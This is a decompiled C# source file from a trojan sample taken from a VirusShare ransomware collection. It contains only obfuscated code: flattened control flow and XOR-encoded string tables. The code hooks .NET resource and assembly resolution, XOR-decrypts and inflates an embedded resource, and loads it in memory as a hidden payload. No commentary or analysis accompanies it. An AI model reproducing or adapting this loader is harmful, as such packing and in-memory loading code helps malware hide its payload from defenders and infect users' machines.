// Decompiled with JetBrains decompiler
// Type: Ⴃ
// Assembly: SyncuiLoaeer, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 059388F9-BBF4-421E-BCD6-B0AFD3B01313
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-42cfbee1dc005e428388ab62313c9fd4643e481f63d030066df90aa925b48883.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Text;

internal sealed class Ⴃ
{
  static Ⴃ() => global::Ⴃ.Ⴈ.Ⴄ();

  internal static void Ⴄ([In] AppDomain obj0, [In] ResolveEventHandler obj1, [In] int obj2, [In] int obj3)
  {
    int num1 = 1;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 5:
          num1 = 1;
          continue;
        case 2:
        case 3:
        case 4:
          goto label_7;
        default:
          int num2;
          switch (obj3 ^ obj2)
          {
            case 59:
              num2 = 3;
              break;
            default:
              num2 = 5;
              break;
          }
          num1 = num2;
          continue;
      }
    }
label_7:
    obj0.AssemblyResolve += obj1;
  }

  internal static string Ⴐ([In] string obj0, [In] string obj1, [In] int obj2, [In] int obj3)
  {
label_3:
    int num1;
    switch (obj3 ^ obj2)
    {
      case 2:
        num1 = 0;
        break;
      default:
        num1 = 1;
        break;
    }
    int num2 = num1;
    while (true)
    {
      switch (num2)
      {
        case 0:
        case 3:
        case 7:
          goto label_8;
        case 1:
        case 4:
          num2 = 2;
          continue;
        case 2:
          goto label_3;
        case 6:
          num2 = 2;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (global::Ⴃ.Ⴐ);
          num2 = 2;
          continue;
      }
    }
label_8:
    return obj0 + obj1;
  }

  internal static Assembly Ⴍ([In] byte[] obj0, [In] int obj1, [In] int obj2)
  {
label_3:
    int num1;
    switch (obj2 ^ obj1)
    {
      case 53:
        num1 = 6;
        break;
      default:
        num1 = 7;
        break;
    }
    int num2 = num1;
    while (true)
    {
      switch (num2)
      {
        case 2:
        case 4:
        case 5:
          goto label_3;
        case 3:
          num2 = 4;
          continue;
        case 6:
          goto label_8;
        case 7:
          num2 = 4;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (global::Ⴃ.Ⴍ);
          num2 = 4;
          continue;
      }
    }
label_8:
    return Assembly.Load(obj0);
  }

  internal static AppDomain Ⴅ([In] int obj0, [In] int obj1)
  {
label_0:
    switch ((obj1 ^ obj0) - 37)
    {
      case 0:
        return AppDomain.CurrentDomain;
      default:
        goto label_0;
    }
  }

  internal static Assembly Ⴀ([In] int obj0, [In] int obj1)
  {
label_0:
    switch ((obj1 ^ obj0) - 7)
    {
      case 0:
        return Assembly.GetExecutingAssembly();
      default:
        goto label_0;
    }
  }

  internal static Stream Ⴃ([In] Assembly obj0, [In] string obj1, [In] int obj2, [In] int obj3)
  {
label_0:
    switch ((obj3 ^ obj2) - 65)
    {
      case 0:
        return obj0.GetManifestResourceStream(obj1);
      default:
        goto label_0;
    }
  }

  internal static int Ⴓ([In] Stream obj0, [In] int obj1, [In] int obj2)
  {
label_0:
    switch ((obj2 ^ obj1) - 37)
    {
      case 0:
        return obj0.ReadByte();
      default:
        goto label_0;
    }
  }

  internal static Assembly Ⴗ([In] byte[] obj0, [In] byte[] obj1, [In] Evidence obj2, [In] int obj3, [In] int obj4)
  {
label_0:
    switch ((obj4 ^ obj3) - 94)
    {
      case 0:
        return Assembly.Load(obj0, obj1, obj2);
      default:
        goto label_0;
    }
  }

  internal sealed class Ⴈ
  {
    private static bool Ⴍ;
    private static readonly char[] ႨႷ;
    private static readonly char[] ႨႨ = new char[43]
    {
      char.MinValue,
      '(',
      char.MinValue,
      '“',
      '㾁',
      'ប',
      '੩',
      '⤕',
      '⪖',
      '\u0B0E',
      'ੁ',
      '‑',
      '㾍',
      '៥',
      'ਛ',
      '⤖',
      '⪕',
      '\u0B79',
      '\u0A45',
      '’',
      '㾂',
      'ភ',
      'ਟ',
      '⤑',
      '⫧',
      '\u0B0D',
      'ਵ',
      '\u206A',
      '㾄',
      '៥',
      '੨',
      '⤐',
      '⪑',
      '\u0B0D',
      '\u0A34',
      '’',
      '㾂',
      'ន',
      'ਛ',
      '⤓',
      '⫧',
      'ଁ',
      'ਸ਼'
    };
    private static readonly string[] ႨႳ;
    internal static global::Ⴃ.Ⴈ.ႨႰ ႨႠ;

    internal static Assembly Ⴃ(object sender, ResolveEventArgs args)
    {
label_3:
      string str1 = global::Ⴃ.Ⴈ.Ⴜ(1184220530, 3);
      string name = str1;
      string str2 = Class1.Ⴐ.Ⴈ((object) name, (object) '1', 681, 766);
      int num1 = 2;
      AppDomain appDomain;
      Dictionary<string, string> dictionary;
      Assembly assembly;
      Stream stream;
      byte[] buffer;
      int num2;
      int index1;
      while (true)
      {
        switch (num1)
        {
          case 1:
            num1 = index1 < buffer.Length ? 17 : 3;
            continue;
          case 2:
            appDomain = global::Ⴃ.Ⴅ(316, 281);
            dictionary = (Dictionary<string, string>) Class1.Ⴜ(appDomain, str2, 82, 86);
            goto case 6;
          case 3:
            goto label_19;
          case 4:
            global::Ⴃ.Ⴈ.Ⴅ.Ⴈ(stream, buffer, 0, buffer.Length, 70, 44);
            num1 = 11;
            continue;
          case 5:
            assembly = global::Ⴃ.Ⴀ(385, 390);
            stream = global::Ⴃ.Ⴃ(assembly, str1, 402, 467);
            num1 = 16;
            continue;
          case 6:
            num1 = 13;
            continue;
          case 7:
          case 17:
            buffer[index1] ^= (byte) (index1 + num2 & (int) byte.MaxValue);
            num1 = 9;
            continue;
          case 8:
            goto label_3;
          case 9:
            ++index1;
            num1 = 1;
            continue;
          case 10:
            buffer = new byte[global::Ⴃ.Ⴈ.ႨႥ(stream, 802, 873) - 1L];
            num1 = 14;
            continue;
          case 11:
            index1 = 0;
            num1 = 1;
            continue;
          case 12:
            dictionary = new Dictionary<string, string>();
            global::Ⴃ.Ⴈ.ႨႭ(appDomain, str2, (object) dictionary, 760, 719);
            num1 = 5;
            continue;
          case 13:
            if (dictionary == null)
            {
              num1 = 12;
              continue;
            }
            goto label_39;
          case 14:
            num2 = global::Ⴃ.Ⴓ(stream, 435, 406);
            goto case 4;
          case 15:
            goto label_11;
          case 16:
            num1 = stream != null ? 10 : 15;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (global::Ⴃ.Ⴈ.Ⴃ);
            num1 = 8;
            continue;
        }
      }
label_11:
      return (Assembly) null;
label_19:
      MemoryStream memoryStream = new MemoryStream();
      DeflateStream deflateStream = new DeflateStream((Stream) new MemoryStream(buffer), CompressionMode.Decompress, true);
      try
      {
        int num3 = 3;
        byte[] numArray;
        int num4;
        while (true)
        {
          switch (num3)
          {
            case 0:
            case 4:
              num3 = (num4 = global::Ⴃ.Ⴈ.Ⴅ.Ⴈ((Stream) deflateStream, numArray, 0, numArray.Length, 933, 974)) > 0 ? 7 : 6;
              continue;
            case 1:
            case 7:
              global::Ⴃ.Ⴈ.ႨႤ((Stream) memoryStream, numArray, 0, num4, 989, 1021);
              goto case 0;
            case 6:
              goto label_30;
            default:
              numArray = new byte[1024];
              num3 = 4;
              continue;
          }
        }
      }
      finally
      {
        int num5 = 5;
        while (true)
        {
          switch (num5)
          {
            case 1:
              goto label_28;
            case 2:
            case 6:
              goto label_29;
            default:
              num5 = deflateStream == null ? 2 : 1;
              continue;
          }
        }
label_28:
        deflateStream.Dispose();
label_29:;
      }
label_30:
      int num6 = 9;
label_31:
      Assembly data;
      string[] manifestResourceNames;
      int index2;
      while (true)
      {
        switch (num6)
        {
          case 0:
            goto label_41;
          case 1:
            appDomain.SetData(name, (object) data);
            goto case 12;
          case 2:
            ++index2;
            num6 = 8;
            continue;
          case 4:
          case 7:
            goto label_42;
          case 5:
            goto label_39;
          case 6:
            num6 = 10;
            continue;
          case 8:
            num6 = index2 < manifestResourceNames.Length ? 11 : 6;
            continue;
          case 10:
            num6 = !dictionary.ContainsKey(args.Name) ? 7 : 0;
            continue;
          case 11:
            string key = manifestResourceNames[index2];
            dictionary[key] = key;
            goto case 2;
          case 12:
            manifestResourceNames = data.GetManifestResourceNames();
            index2 = 0;
            num6 = 8;
            continue;
          default:
            data = global::Ⴃ.Ⴗ(global::Ⴃ.Ⴈ.ႨႣ(memoryStream, 601, 584), (byte[]) null, global::Ⴃ.Ⴈ.ႨႼ(assembly, 401, 477), 89, 7);
            num6 = 1;
            continue;
        }
      }
label_41:
      return data;
label_42:
      return (Assembly) null;
label_39:
      data = (Assembly) appDomain.GetData(name);
      num6 = 10;
      goto label_31;
    }

    internal static AppDomain Ⴗ([In] int obj0, [In] int obj1)
    {
label_3:
      int num1;
      switch (obj1 ^ obj0)
      {
        case 87:
          num1 = 5;
          break;
        default:
          num1 = 2;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
            num2 = 7;
            continue;
          case 2:
            num2 = 7;
            continue;
          case 3:
          case 5:
          case 6:
            goto label_8;
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (global::Ⴃ.Ⴈ.Ⴗ);
            num2 = 7;
            continue;
        }
      }
label_8:
      return AppDomain.CurrentDomain;
    }

    internal static Encoding Ⴈ([In] int obj0, [In] int obj1)
    {
label_3:
      int num1;
      switch (obj1 ^ obj0)
      {
        case 44:
          num1 = 6;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
            num2 = 7;
            continue;
          case 1:
          case 3:
            num2 = 7;
            continue;
          case 4:
          case 7:
            goto label_3;
          case 6:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (global::Ⴃ.Ⴈ.Ⴈ);
            num2 = 7;
            continue;
        }
      }
label_8:
      return Encoding.Default;
    }

    internal static double Ⴓ([In] string obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 51:
          num1 = 1;
          break;
        default:
          num1 = 6;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_3;
          case 1:
            goto label_8;
          case 3:
          case 5:
            num2 = 0;
            continue;
          case 6:
            num2 = 0;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (global::Ⴃ.Ⴈ.Ⴓ);
            num2 = 0;
            continue;
        }
      }
label_8:
      return Conversion.Val(obj0);
    }

    internal static double Ⴐ([In] double obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 118:
          num1 = 2;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 4;
            continue;
          case 1:
          case 2:
          case 6:
          case 7:
            goto label_8;
          case 3:
            num2 = 4;
            continue;
          case 4:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (global::Ⴃ.Ⴈ.Ⴐ);
            num2 = 4;
            continue;
        }
      }
label_8:
      return Math.Round(obj0);
    }

    internal static Assembly Ⴀ([In] int obj0, [In] int obj1)
    {
label_3:
      int num1;
      switch (obj1 ^ obj0)
      {
        case 123:
          num1 = 3;
          break;
        default:
          num1 = 7;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 3:
            goto label_8;
          case 1:
          case 6:
            num2 = 5;
            continue;
          case 2:
          case 7:
            num2 = 5;
            continue;
          case 5:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (global::Ⴃ.Ⴈ.Ⴀ);
            num2 = 5;
            continue;
        }
      }
label_8:
      return Assembly.GetExecutingAssembly();
    }

    internal static void Ⴄ()
    {
      int num1 = 4;
      while (true)
      {
        switch (num1)
        {
          case 2:
            goto label_4;
          default:
            if (!global::Ⴃ.Ⴈ.Ⴍ)
            {
              num1 = 2;
              continue;
            }
            goto label_10;
        }
      }
label_10:
      return;
label_4:
      lock (typeof (global::Ⴃ.Ⴈ))
      {
        int num2 = 3;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              goto label_12;
            case 1:
            case 5:
              AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(global::Ⴃ.Ⴈ.Ⴃ);
              num2 = 2;
              continue;
            case 4:
              global::Ⴃ.Ⴈ.Ⴍ = true;
              goto case 1;
            default:
              num2 = global::Ⴃ.Ⴈ.Ⴍ ? 2 : 4;
              continue;
          }
        }
      }
label_12:
      int num3 = 2;
      while (true)
      {
        switch (num3)
        {
          case 0:
          case 3:
          case 4:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (global::Ⴃ.Ⴈ.Ⴄ);
            num3 = 1;
            continue;
          case 1:
            goto label_16;
          default:
            num3 = 1;
            continue;
        }
      }
label_16:;
    }

    static Ⴈ()
    {
      char[] chArray = new char[8]
      {
        '\u2029',
        char.MinValue,
        char.MinValue,
        char.MinValue,
        char.MinValue,
        '⫗',
        char.MinValue,
        char.MinValue
      };
      chArray[3] = 'ਬ';
      chArray[4] = '⤠';
      chArray[1] = '㾴';
      chArray[2] = 'ហ';
      chArray[7] = '\u0A77';
      chArray[6] = 'ସ';
      global::Ⴃ.Ⴈ.ႨႳ = new string[1];
      global::Ⴃ.Ⴈ.ႨႷ = chArray;
    }

    internal static string Ⴜ([In] int obj0, [In] int obj1)
    {
      int index1 = obj0 ^ 1184220529 ^ obj1;
      char[] ⴈⴈ = global::Ⴃ.Ⴈ.ႨႨ;
      int index2 = (int) ⴈⴈ[index1];
      string str1;
      if ((str1 = global::Ⴃ.Ⴈ.ႨႳ[index2]) != null)
        return str1;
      int num1 = (int) ⴈⴈ[index1 + 1];
      int length1 = ((int) ⴈⴈ[index1 + 2] << 16) + num1;
      char[] chArray = new char[length1];
      char[] ⴈⴗ = global::Ⴃ.Ⴈ.ႨႷ;
      int length2 = ⴈⴗ.Length;
      int num2 = index1 + 3;
      for (int index3 = 0; index3 < length1; index3 = 1 + index3)
        chArray[index3] = (char) ((uint) ⴈⴈ[num2 + index3] ^ (uint) ⴈⴗ[(index3 + index2) % length2]);
      string str2 = new string(chArray);
      global::Ⴃ.Ⴈ.ႨႳ[index2] = str2;
      return str2;
    }

    internal static void ႨႭ([In] AppDomain obj0, [In] string obj1, [In] object obj2, [In] int obj3, [In] int obj4)
    {
label_0:
      switch ((obj4 ^ obj3) - 55)
      {
        case 0:
          obj0.SetData(obj1, obj2);
          break;
        default:
          goto label_0;
      }
    }

    internal static long ႨႥ([In] Stream obj0, [In] int obj1, [In] int obj2)
    {
label_0:
      switch ((obj2 ^ obj1) - 75)
      {
        case 0:
          return obj0.Length;
        default:
          goto label_0;
      }
    }

    internal static void ႨႤ([In] Stream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
    {
label_0:
      switch ((obj5 ^ obj4) - 32)
      {
        case 0:
          obj0.Write(obj1, obj2, obj3);
          break;
        default:
          goto label_0;
      }
    }

    internal static byte[] ႨႣ([In] MemoryStream obj0, [In] int obj1, [In] int obj2)
    {
label_0:
      switch ((obj2 ^ obj1) - 17)
      {
        case 0:
          return obj0.ToArray();
        default:
          goto label_0;
      }
    }

    internal static Evidence ႨႼ([In] Assembly obj0, [In] int obj1, [In] int obj2)
    {
label_0:
      switch ((obj2 ^ obj1) - 76)
      {
        case 0:
          return obj0.Evidence;
        default:
          goto label_0;
      }
    }

    internal sealed class Ⴅ
    {
      internal static string[] Ⴃ(
        [In] string obj0,
        [In] string obj1,
        [In] int obj2,
        [In] CompareMethod obj3,
        [In] int obj4,
        [In] int obj5)
      {
label_3:
        int num1;
        switch (obj5 ^ obj4)
        {
          case 9:
            num1 = 6;
            break;
          default:
            num1 = 7;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 2:
            case 4:
              num2 = 3;
              continue;
            case 3:
            case 5:
              goto label_3;
            case 6:
              goto label_8;
            case 7:
              num2 = 3;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (global::Ⴃ.Ⴈ.Ⴅ.Ⴃ);
              num2 = 3;
              continue;
          }
        }
label_8:
        return Strings.Split(obj0, obj1, obj2, obj3);
      }

      internal static string Ⴗ([In] ResolveEventArgs obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 37:
            num1 = 5;
            break;
          default:
            num1 = 6;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 1:
            case 6:
            case 7:
              num2 = 3;
              continue;
            case 3:
              goto label_3;
            case 4:
              num2 = 3;
              continue;
            case 5:
              goto label_8;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (global::Ⴃ.Ⴈ.Ⴅ.Ⴗ);
              num2 = 3;
              continue;
          }
        }
label_8:
        return obj0.Name;
      }

      internal static Stream Ⴓ([In] Assembly obj0, [In] string obj1, [In] int obj2, [In] int obj3)
      {
label_3:
        int num1;
        switch (obj3 ^ obj2)
        {
          case 58:
            num1 = 4;
            break;
          default:
            num1 = 6;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 4:
            case 7:
              goto label_8;
            case 1:
              goto label_3;
            case 2:
            case 3:
              num2 = 1;
              continue;
            case 6:
              num2 = 1;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (global::Ⴃ.Ⴈ.Ⴅ.Ⴓ);
              num2 = 1;
              continue;
          }
        }
label_8:
        return obj0.GetManifestResourceStream(obj1);
      }

      internal static string Ⴍ([In] char obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 12:
            num1 = 0;
            break;
          default:
            num1 = 4;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 6:
              goto label_8;
            case 1:
            case 5:
              num2 = 3;
              continue;
            case 3:
              goto label_3;
            case 4:
              num2 = 3;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (global::Ⴃ.Ⴈ.Ⴅ.Ⴍ);
              num2 = 3;
              continue;
          }
        }
label_8:
        return Conversions.ToString(obj0);
      }

      internal static int Ⴈ([In] Stream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
      {
label_0:
        switch ((obj5 ^ obj4) - 106)
        {
          case 0:
            return obj0.Read(obj1, obj2, obj3);
          case 1:
            return obj0.Read(obj1, obj2, obj3);
          default:
            goto label_0;
        }
      }
    }

    [StructLayout(LayoutKind.Explicit, Size = 86, Pack = 1)]
    private struct ႨႰ
    {
    }
  }
}
